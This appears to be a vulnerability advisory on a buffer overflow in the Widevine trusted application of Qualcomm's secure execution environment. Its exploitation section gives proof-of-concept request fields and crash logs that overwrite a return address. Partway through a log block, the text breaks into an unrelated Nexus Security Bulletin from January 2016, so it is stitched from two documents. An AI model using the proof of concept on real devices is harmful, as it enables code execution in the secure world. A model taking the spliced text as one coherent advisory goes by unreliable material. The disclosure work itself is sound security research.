# 1. Description

Warning

To the best of our knowledge, the vulnerability described in this post
[has been incorrectly associated with CVE-2015-6639](https://bits-please.blogspot.com/2016/05/qsee-privilege-escalation-vulnerability.html).
After consulting with MITRE, it has been confirmed that this vulnerability
had no assigned identifier. Consequently, [CVE-2022-48335](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-48335) has been assigned to this
vulnerability.

On the other hand, it has been confirmed that [CVE-2015-6639](../CVE-2015-6639_Buffer_Overflow_in_Widevine_PRDiagParseAndStoreData_0x5c9c/index.html)
does exist and corresponds with a different vulnerability reported by Google.
We have notified all the concerned parties about this misunderstanding so that
the confusion can be amended.

This entry describes a vulnerability that we found in the Widevine Trusted Application (TA), which runs within
Qualcomm’s Secure Execution Environment (QSEE). The vulnerability is an integer overflow
that leads to a subsequent buffer overflow.
This bug has been found using tools we have developed to assist in the security evaluation
of TrustZone, including a debugger and a coverage-based fuzzer for QSEE TAs. Please, refer to
[this page](../../publications/2022-11-17_DeepSec_pub/index.html)
for further information.

Qualcomm Secure Execution Environment is one of the most widespread commercial TEE solutions
in the smartphone space, used by many different devices such as Xiaomi, Motorola and
several devices of the Google Nexus and Pixel series.

Widevine is a Digital Rights Management (DRM) technology developed by Google to protect
copyrighted content and to enable secure distribution and consumption of video and audio
content. The technology involves encryption, licensing, and key management to ensure that
content can only be decrypted and played back on authorized devices.

An attacker could potentially exploit the vulnerability in the Trusted Application by sending a
command from the Normal World, causing the application to crash and possibly execute arbitrary code.
This vulnerability could have potential consequences, such as elevating attacker’s privileges and
exposing sensitive information.

This post is part of a series of related bugs affecting Widevine Trusted Application of Google

# 3. Impact

This vulnerability has the potential to compromise the security of the system in multiple ways.

An attacker with high priviledges in Normal World can exploit the vulnerability to compromise
the Trusted Application running in the Secure World, eventually executing arbitrary code and
reading and/or modifying information of critical files,
compromising the confidentiality and integrity of the system.

On the other hand, the attacker is able to crash the Trusted Application, potentially resulting
in a denial of service.

# 4. Vulnerability

The bug is present in Widevine’s `PRDiagVerifyProvisioning()` command.
This command closely resembles `PRDiagClearProvisioning()`, which has been featured in other blog entries
(refer to
[CVE-2015-6647](../CVE-2015-6647_Buffer_Overflow_in_Widevine_PRDiagClearProvisioning_0x583c/index.html)).

The following snippet shows a switch-case present in the TA’s `command handler`:

```
switch(*req_buf) {
case 0x50003: // PRDiagMaintenanceHandler
    if ((0x2807 < req_buf_size) && (7 < resp_buf_size)) {
        ret = PRDiagMaintenanceHandler(req_buf + 2, req_buf[1]);
        ...
    }
    break;
}

```

It takes the `Command ID` from the first word of the Request Buffer, which is sent by client
applications in the Normal World. Thus, if the received command is `0x50003`,
it jumps to the `PRDiagMaintenanceHandler()` function. This function handles two sub-commands:
`PRDiagVerifyProvisioning` and `PRDiagClearProvisioning`.

The structure of the Request Buffer for the `PRDiagMaintenanceHandler()` function is the following:

```
struct widevine_PRDiagMaintenanceHandler_cmd {
        uint32_t cmd_id;
        uint32_t payload_size;
        struct widevine_PRDiagMaintenanceHandler_payload payload;
};

```

It contains an embedded structure and an integer indicating its size. The embedded structure is
defined in the following code-block:

```
// Internal payload/request buffer for PRDiagMaintenanceHandler command
struct widevine_PRDiagMaintenanceHandler_payload {
        enum {
                op_PRDiagVerifyProvisioning    = 0,
                op_PRDiagClearProvisioning     = 1,
                PRDiagMH_FORCE_ENUM_32_BITS = (INT_MAX | ~INT_MAX),
        } op;
        uint32_t compare_flag;
        uint32_t msg_buf_size;
        uint32_t data_len;
        // The buffer containing the input data for the PRDiagVerifyProvisioning function.
        // This data could be related to provisioning information, cryptographic keys,
        // or other DRM-related metadata.
        // NOTE: The widevine trustlet checks the size of the request buffer
        // containing the widevine_PRDiagMaintenanceHandler_cmd structure.
        // The entire request buffer must have at least 0x2808 bytes
        char msg_buf[];
};

```

The relevant parts are the `op` value indicating the sub-command to be executed
(either `PRDiagVerifyProvisioning` or `PRDiagClearProvisioning`), an input buffer called
`msg_buf` and its size, stored in `msg_buf_size`.

The `PRDiagMaintenanceHandler` function simply copies
the payload/request into a temporary heap buffer and passes it to the corresponding sub-command:

```
int PRDiagMaintenanceHandler(void *payload, uint32_t payload_size) {
     struct widevine_PRDiagMaintenanceHandler_payload *req;

     if (!payload || !payload_size) return 0x10;

     req = malloc(payload_size);
     if (!req) return 0xf;

     memcpy(req, payload, payload_size);
     if (req->op == 0) {
         PRDiagVerifyProvisioning(req);
     }
     else if (req->op == 1) {
         PRDiagClearProvisioning(req);
     }
     ...

```

For this bug, let’s focus on the `PRDiagVerifyProvisioning` sub-command.
The main functionality of this function is to check the integrity and
authenticity of the provisioning data by comparing it to the corresponding data stored in the
Secure File System (SFS).

The following code snippet shows a simplified version of the `PRDiagVerifyProvisioning` function:

```
int PRDiagVerifyProvisioning(struct widevine_PRDiagMaintenanceHandler_payload *req) {
    // Check input and operation
    if (!req || req->op != 0) return 0x10;

    msg_buf_size = req->msg_buf_size;
    msg_buf = &req->msg_buf;
    ...
    if (!req->data_len) {
        strlen(&persist_prefix); // result ignored
        memzero(&filePathBuffer, 0x80); // 0x2e0fc
        memcpy(&filePathBuffer, msg_buf, msg_buf_size);
    }
    else {
        ...

```

The function first performs some validations on the input and the operation being requested and
then checks the `data_len` value. If this value is zero, it copies the user-controlled
`msg_buf` into a buffer in the data segment (`0x2e0fc`). The contents and size of this buffer
are directly specified by the client through the Request Buffer.

The hardcoded value of the `memzero` suggests that the size of this buffer is 128 bytes.
However, since `msg_buf_size` is not being checked, this copy operation can cause a buffer overflow:

[![_images/widevine-memory-5f90.svg](_images/widevine-memory-5f90.svg)](_images/widevine-memory-5f90.svg)

This vulnerability allows an attacker to overwrite important data structures such as the
stack and heap, since they are in higher addresses within this same data segment.

# 5. Exploitation

This section shows a Proof of Concept (PoC) of how to trigger the vulnerability by sending a
command to the Widevine trusted application running in the Secure World. Based on the
[command structure we have derived by reverse engineering](#vulnerability),
we can craft the command request to be sent to the trusted application:

```
req->cmd_id = 0x50003;  // PRDiagMaintenanceHandler
req->payload.op = 0;    // PRDiagVerifyProvisioning
req->payload.msg_buf_size = 0x1644;
// 0x1644 overwrites ret-code in the stack
...
memset(req->payload.msg_buf, 'A', req->payload.msg_buf_size);

```

The Commmand ID `0x50003` is specified to invoke `PRDiagMaintenanceHandler()`, and
the `PRDiagVerifyProvisioning` operation is being specified. In addition, `msg_buf_size` is set
to `0x1644` so that it overflows the data buffer and ends up overwriting the return code in the
stack:

```
<5>widevine: "PRDiagMaintenanceHandler: pTzMsg 0xfff00008, reqlen 10240"
<5>widevine: "PRDiagVerifyProvisioning: begins!"
<5>widevine: "PRDiagVerifyProvisioning: returned 1094795585"
<5>widevine: "PRDiagMaintenanceHandler: returned 1094795585"

```

It can be observed that the returning value is `1094795585`, which is the decimal representation
of the value `0x41414141` that comes from our `msg_buf` buffer. We can also verify that this
value is stored in the response buffer returned by the trusted application:

```
[*] Widevine PRDiagMaintenanceHandler => Return code: 0x41414141

```

Adding four more bytes to the buffer being copied allows us to overwrite the return address in the
stack and thus give us control over the execution flow:

```
req->cmd_id = 0x50003;  // PRDiagMaintenanceHandler
req->payload.op = 0;    // PRDiagVerifyProvisioning
req->payload.msg_buf_size = 0x1648;
// 0x1648 overwrites return address in the stack
...
memset(req->payload.msg_buf, 'A', req->payload.msg_buf_size);

```

Note that the difference is that we added four bytes to `msg_buf_size`:

```
<5>widevine: "PRDiagMaintenanceHandler: pTzMsg 0xfff00008, reqlen 10240"
<5>widevine: "PRDiagVerifyProvisioning: begins!"
*** crash @ 0x41414140 ***

```

The Android log in normal world reports that `qseecom_send_cmd` has failed with error -22,
which means APP\_FAULTED. In this case, Widevine crashes because it ends up jumping to the
address `0x41414140` coming from our `msg_buf` buffer.

```
<4>QSEECOM: qseecom_load_app: App (widevine) does'nt exist, loading apps for first time
<4>QSEECOM: qseecom_load_app: App with id 3 (widevine) now loaded
<3>QSEECOM: __qseecom_send_cmd: Response result -1 not supported
<3>QSEECOM: qseecom_ioctl: failed qseecom_send_cmd: -22
<4>QSEECOM: qseecom_unload_app: App id 3 now unloaded

# Nexus Security Bulletin—January 2016

Stay organized with collections

Save and categorize content based on your preferences.

*Published January 04, 2016 | Updated April 28, 2016*

We have released a security update to Nexus devices through an over-the-air
(OTA) update as part of our Android Security Bulletin Monthly Release process.
The Nexus firmware images have also been released to the [Google Developer site](https://developers.google.com/android/nexus/images). Builds LMY49F or later and Android 6.0 with Security Patch Level of January
1, 2016 or later address these issues. Refer to the [Common Questions and Answers](#common_questions_and_answers) section for more details.

Partners were notified about and provided updates for the issues described in
this bulletin on December 7, 2015 or earlier. Where applicable, source code
patches for these issues have been released to the Android Open Source Project (AOSP) repository.

The most severe of these issues is a Critical security vulnerability that could
enable remote code execution on an affected device through multiple methods
such as email, web browsing, and MMS when processing media files. The
[severity
assessment](/docs/security/overview/updates-resources#severity) is based on the effect that exploiting the vulnerability would
possibly have on an affected device, assuming the platform and service
mitigations are disabled for development purposes or if successfully bypassed.

We have had no reports of active customer exploitation of these newly reported
issues. Refer to the [Mitigations](#mitigations) section for details on the
[Android security platform protections](/docs/security/enhancements)
and service protections such as SafetyNet, which improve the security of the
Android platform. We encourage all customers to accept these updates to their
devices.

## Mitigations

This is a summary of the mitigations provided by the
[Android security platform](/docs/security/enhancements)
and service protections such as SafetyNet. These capabilities reduce the
likelihood that security vulnerabilities could be successfully exploited on
Android.

* Exploitation for many issues on Android is made more difficult by enhancements
  in newer versions of the Android platform. We encourage all users to update to
  the latest version of Android where possible.* The Android Security team is actively monitoring for abuse with Verify Apps and
    SafetyNet which will warn about potentially harmful applications about to be
    installed. Device rooting tools are prohibited within Google Play. To protect
    users who install applications from outside of Google Play, Verify Apps is
    enabled by default and will warn users about known rooting applications. Verify
    Apps attempts to identify and block installation of known malicious
    applications that exploit a privilege escalation vulnerability. If such an
    application has already been installed, Verify Apps will notify the user and
    attempt to remove any such applications.* As appropriate, Google Hangouts and Messenger applications do not automatically
      pass media to processes such as mediaserver.

## Security Vulnerability Details

In the sections below, we provide details for each of the security
vulnerabilities that apply to the 2016-01-01 patch level.
There is a description of the issue, a severity rationale, and a table
with the CVE, associated bug, severity, updated versions, and date reported.
When available, we will link the AOSP change that addressed the issue to the
bug ID. When multiple changes relate to a single bug, additional AOSP
references are linked to numbers following the bug ID.

### Remote Code Execution Vulnerability in Mediaserver

During media file and data processing of a specially crafted file,
vulnerabilities in mediaserver could allow an attacker to cause memory
corruption and remote code execution as the mediaserver process.

The affected functionality is provided as a core part of the operating system
and there are multiple applications that allow it to be reached with remote
content, most notably MMS and browser playback of media.

This issue is rated as a Critical severity due to the possibility of remote
code execution within the context of the mediaserver service. The mediaserver
service has access to audio and video streams as well as access to privileges
that third-party apps cannot normally access.

### Attack Surface Reduction for Nexus Kernels

SysV IPC is not supported in any Android Kernel. We have removed this from the
OS as it exposes additional attack surface that doesn’t add functionality to
the system that could be exploited by malicious applications. Also, System V
IPCs are not compliant with Android's application lifecycle because the
allocated resources are not freeable by the memory manager leading to global
kernel resource leakage. This change addresses issue such as CVE-2015-7613.
